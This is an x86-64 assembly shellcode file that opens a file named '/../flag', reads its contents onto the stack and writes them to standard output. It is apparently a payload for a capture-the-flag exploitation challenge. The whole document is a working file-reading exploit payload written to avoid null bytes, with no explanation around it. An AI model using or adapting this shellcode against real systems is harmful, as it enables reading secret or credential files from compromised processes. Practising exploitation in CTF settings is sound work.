.global _start
.intel_syntax noprefix

_start:

open:
    xor rax, rax
    push rax
    mov rax, 0x67616c662f2e2e2f ; make it /../flag 8bytes
    push rax
    mov rdi ,rsp
    xor rsi, rsi
    xor rax, rax
    mov al, 2
    syscall
read:
    mov edi, eax
    lea rsi, [rsp]
    push 0x11111111
    pop rdx
    xor rax, rax
    syscall
write:
    xor edi, edi
    inc edi
    mov rsi, rsp
    mov rdx, rax
    xor rax, rax
    mov al, 1
    syscall
exit:
    xor rax, rax
    mov al, 60
    syscall
binbash:
    .ascii "/flag"
